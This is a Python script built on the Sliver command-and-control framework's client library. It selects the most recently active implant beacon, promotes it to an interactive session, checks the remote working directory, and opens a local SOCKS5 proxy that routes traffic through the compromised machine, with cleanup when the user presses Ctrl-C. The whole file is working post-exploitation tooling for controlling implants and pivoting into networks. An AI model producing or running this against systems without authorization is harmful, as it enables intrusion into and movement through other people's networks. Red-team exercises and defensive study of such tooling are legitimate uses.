#!/usr/bin/env python3
"""
• Pick newest live Sliver beacon
• Promote → interactive session
• Launch local SOCKS-5 proxy on 127.0.0.1:1080
• Clean up on Ctrl-C
   - Session closed via interactive_session_close()
   - Client closed or disconnected depending on build
"""

import asyncio
import contextlib
import logging
import signal
import sys
from pathlib import Path
from typing import Optional, Set, Tuple, Union

from sliver import SliverClient, SliverClientConfig

# ─── user settings ─────────────────────────────────────────────────────
CONFIG_PATH = Path("~/.sliver-client/configs/sliverpy.cfg").expanduser()
SOCKS_ADDR  = "127.0.0.1"
SOCKS_PORT  = 1080
TIMEOUT     = 90
POLL_EVERY  = 2
# ───────────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s %(levelname)-8s %(message)s",
    stream=sys.stderr,
)

# ─── helpers ──────────────────────────────────────────────────────────
def beacon_sort_key(b) -> int:
    return (
        getattr(b, "LastSeen", 0)
        or getattr(b, "last_seen", 0)
        or getattr(b, "Timestamp", 0)
        or getattr(b, "Time", 0)
    )

def sid(obj) -> Optional[str]:
    return (
        getattr(obj, "session_id", None)
        or getattr(obj, "ID", None)
        or getattr(obj, "id", None)
    )

async def poll_for_new_session(
    client: SliverClient,
    old_ids: Set[str],
    timeout: int,
    every: int,
) -> str:
    deadline = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < deadline:
        for s in await client.sessions():
            s_id = sid(s)
            if s_id and s_id not in old_ids:
                return s_id
        await asyncio.sleep(every)
    raise TimeoutError("Session did not appear within timeout")

async def wait_via_event_bus(
    client: SliverClient,
    old_ids: Set[str],
    timeout: int,
) -> Optional[str]:
    if not hasattr(client, "on"):
        return None
    try:
        async def _listener():
            async for ev in client.on("session-connected"):
                s_id = sid(ev.Session)
                if s_id and s_id not in old_ids:
                    return s_id
        return await asyncio.wait_for(_listener(), timeout)
    except (asyncio.TimeoutError, RuntimeError):
        return None

# ─── main ─────────────────────────────────────────────────────────────
async def main():
    cfg    = SliverClientConfig.parse_config_file(CONFIG_PATH)
    client = SliverClient(cfg)
    await client.connect()

    # 1) newest beacon
    beacons = await client.beacons()
    if not beacons:
        print("[!] No live beacons.")
        await (client.close() if hasattr(client, "close") else client.disconnect())
        return
    beacons.sort(key=beacon_sort_key, reverse=True)
    b    = beacons[0]
    bid  = getattr(b, "ID", None) or getattr(b, "beacon_id", None)
    print(f"[+] Using latest beacon {bid}")

    # 2) request promotion
    prev_ids = {sid(s) for s in await client.sessions() if sid(s)}
    ib = await client.interact_beacon(bid)
    print("[*] Requesting interactive session …")
    try:
        await ib.interactive_session()
    except TypeError:
        ib.interactive_session()

    # 3) wait for session
    print(f"[*] Waiting ≤{TIMEOUT}s for session registration …")
    new_sid = await wait_via_event_bus(client, prev_ids, TIMEOUT)
    if new_sid is None:
        new_sid = await poll_for_new_session(client, prev_ids, TIMEOUT, POLL_EVERY)
    print(f"[+] Beacon promoted → session {new_sid}")
    sess = await client.interact_session(new_sid)

    # 4) optional sanity check
    try:
        pwd = await sess.pwd()
        print(f"[*] Remote cwd: {pwd.Path}")
    except Exception:
        pass

    # 5) start SOCKS proxy (handle both return styles)
    socks_ret: Union[
        asyncio.Server, Tuple[asyncio.Server, asyncio.Event, asyncio.Task]
    ] = await sess.socks5_start(
        bind_addr=SOCKS_ADDR,
        bind_port=SOCKS_PORT,
        username="",
        password="",
    )
    if isinstance(socks_ret, tuple):
        socks_server, socks_stop_evt, waiter = socks_ret
    else:
        socks_server, socks_stop_evt, waiter = socks_ret, None, None

    # 6) Ctrl-C handler
    stop_evt = asyncio.Event()
    loop     = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, stop_evt.set)

    try:
        await stop_evt.wait()
    finally:
        print("\n[*] Tearing down …")

        # stop SOCKS
        try:
            if socks_stop_evt:
                socks_stop_evt.set()
            socks_server.close()
            await socks_server.wait_closed()
            print("[*] SOCKS listener stopped")
        except Exception as e:
            logging.debug(f"SOCKS shutdown: {e}")

        # cancel waiter task if present
        if waiter and not waiter.done():
            waiter.cancel()
            with contextlib.suppress(Exception):
                await waiter

        # close session via interactive_session_close()
        try:
            if hasattr(sess, "interactive_session_close"):
                fn = sess.interactive_session_close
                if asyncio.iscoroutinefunction(fn):
                    await fn()
                else:
                    fn()
                print("[*] Session closed")
        except Exception as e:
            logging.debug(f"Session teardown: {e}")

        print("[+] Clean exit - goodbye!")

# ───────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    asyncio.run(main())
